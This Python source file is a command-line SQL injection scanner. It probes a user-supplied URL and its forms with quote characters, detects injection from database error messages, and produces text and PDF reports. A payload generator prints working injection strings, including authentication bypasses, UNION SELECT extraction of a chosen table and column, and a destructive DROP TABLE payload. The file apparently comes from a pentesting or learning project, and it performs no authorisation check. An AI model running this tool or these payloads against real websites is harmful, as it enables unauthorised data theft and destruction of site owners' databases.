import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
import time
from fpdf import FPDF
import datetime
import threading
#ascii art module
import Display

# file  used to store the report content.
output = open("report.txt", "w")
def addToReport(content):
    output.write(content + "\n")

#requests session to make HTTP requests
s = requests.Session()
# Setting user-agent header 
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
# Send a GET request to the url and parsing the response using BeautifulSoup to extract HTML content.
def getForms(url):
    soup = bs(s.get(url).content, "html.parser")
    forms = soup.find_all("form")
    addToReport(f"Forms found on {url}: {len(forms)}")
    return soup.find_all("form")

#extract details about forms
def getDetails(form):
    details = {} #for storing form details
#extract action and method attribute of <form> tag:
    try:
        action = form.get("action", "").lower()
    except AttributeError:
        action = None
    method = form.get("method", "get").lower()
    # extracting details of input fields within the form.
    inputs = []
    for tag in form.find_all("input"):
        type_ = tag.get("type", "text")
        name = tag.get("name")
        value = tag.get("value", "")
        inputs.append({"type": type_, "name": name, "value": value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details

    #check if url is vulnerable
def isVul(response):
    # Dict with  error messages indicating SQL vulnerabilities .
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        # PostgreSQL
        "syntax error at or near",
        # SQLite
        "near \"syntax error\"",
        # DB2
        "sql syntax error",
        # MariaDB
        "mariadb server version for the right syntax",
        # Access
        "syntax error in string in query expression",
        # Informix
        "syntax error",
    }

    # if any of these errors are found, it means thers is a SQL injection vulnerability.
    for error in errors:
        if error in response.content.decode().lower():
            return True
    
    return False



def scanner(url, forms=None):
    if forms is None:
        forms = getForms(url)
    
    # test on URL
    for i in "\"'":
        new_url = f"{url}{i}"
        print("[!] Scanning url ...", new_url)
        time.sleep(2)
        
        # make an HTTP request to the new URL
        try:
            res = requests.get(new_url)
            res.raise_for_status()  #handel request exceptions
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            continue  
        
        if isVul(res):
            # SQL Injection detected on the URL 
            print("\033[93m" + "[+] SQL Injection vulnerability detected, link:" + "\033[0m", new_url)
            addToReport(f"SQL Injection vulnerability detected in URL: {new_url}")
            return


    # test on HTML forms
    forms = getForms(url)
    print("\033[93m" + f"[+] Detected {len(forms)} forms on {url}." + "\033[0m")
    for form in forms:
        details = getDetails(form)
        for i in "\"'":
            # the data body we want to submit
            data = {}
            for tag in details["inputs"]:
                if tag["type"] == "hidden" or tag["value"]:
                    
                    try:
                        data[tag["name"]] = tag["value"] + i
                    except:
                        pass
                elif tag["type"] != "submit":
               
                    data[tag["name"]] = f"test{i}"
       
            url = urljoin(url, details["action"])
            if details["method"] == "post":
                res = s.post(url, data=data)
            elif details["method"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if isVul(res):
                print("\033[93m" + "[+] SQL Injection vulnerability detected, link:" + "\033[0m" ,url )
                print("[+] Form:")
                pprint(details)
                addToReport("SQL Injection vulnerability detected in form:")
                addToReport(f"URL: {url}")
                addToReport("Form details:")
                addToReport(f"{details}")
                break

def payloadGen(table, column):
    payloads = [
        f"'OR 1=1 -- ",
        f"'OR '1'='1' --",
        f"'AND 1=1--",
        f"'; DROP TABLE {table}; --",
        f"' UNION SELECT {column} FROM {table}; --",
        f"' OR {column} IS NULL --",
        f"' UNION ALL SELECT 1-- ",
        f"UNION ALL SELECT 1,2-- ",
        f"UNION ALL SELECT 1,2,3-- ",
                f"' UNION SELECT {column} FROM {table} WHERE '{column}' = '{column}' --",
        f"' UNION SELECT {column} FROM {table} WHERE '{column}' > '{column}' --",
        f"' UNION SELECT {column} FROM {table} WHERE '{column}' < '{column}' --",
        f"' OR EXISTS(SELECT * FROM {table}); --"
    ]
    addToReport("\n---------SQL Injection Payloads------------")
    for payload in payloads:
        addToReport(payload)

    return payloads  
    

#func to handel threads

def handleThreads(url):
    forms = getForms(url)
    threads = []

    # handeling forms
    def scan_form(form):
        scanner(url, [form])

    # threads for each form
    for form in forms:
        thread = threading.Thread(target=scan_form, args=(form,))
        threads.append(thread)
        thread.start()

    
    for thread in threads:
        thread.join()

    print("\033[92m" + f"Scanning of {len(forms)} forms on {url} completed." + "\033[0m")


def generate_report():
    output.close()
    pdf=FPDF()
    pdf.add_page()
    pdf.set_font("Arial",size=10)

    with open("report.txt","r") as file:
        content=file.read()
        pdf.multi_cell(200,10,content)

    pdf.output("report.pdf")      

if __name__ == "__main__":
    Display.toolScreen()
    addToReport("-------SQL Vulnerability Website Report--------")
    addToReport("-----------------------------------------------")
    currentDatetime = datetime.datetime.now()
    addToReport("Date-Time:"+ str(currentDatetime))
    

 #main function  
def runFunction(option):
    if option == '1':
        url = input("Enter url to scan >>> ")
        handleThreads(url)

    elif option == '2':
        t = input("Enter table name >>>")
        c = input("Enter column name >>>")
        output = payloadGen(t,c)
        print("\033[92m" + "Generating Payloads..." + "\033[0m")
        time.sleep(1)
        for i in output:
            print(i)
            time.sleep(0.3)
        

    elif option == '3':

        generate_report()
        print("\033[92m" + "report.pdf has been generated." + "\033[0m")

    elif option == '4':
        print("Exiting the program...")
        time.sleep(1)
        quit()
    else:
        print("Invalid option.")

while True:
    o = input("Enter your option >>> ")
    runFunction(o)



        
#url to test:
#http://testphp.vulnweb.com/artists.php?artist=2"

    

    
    
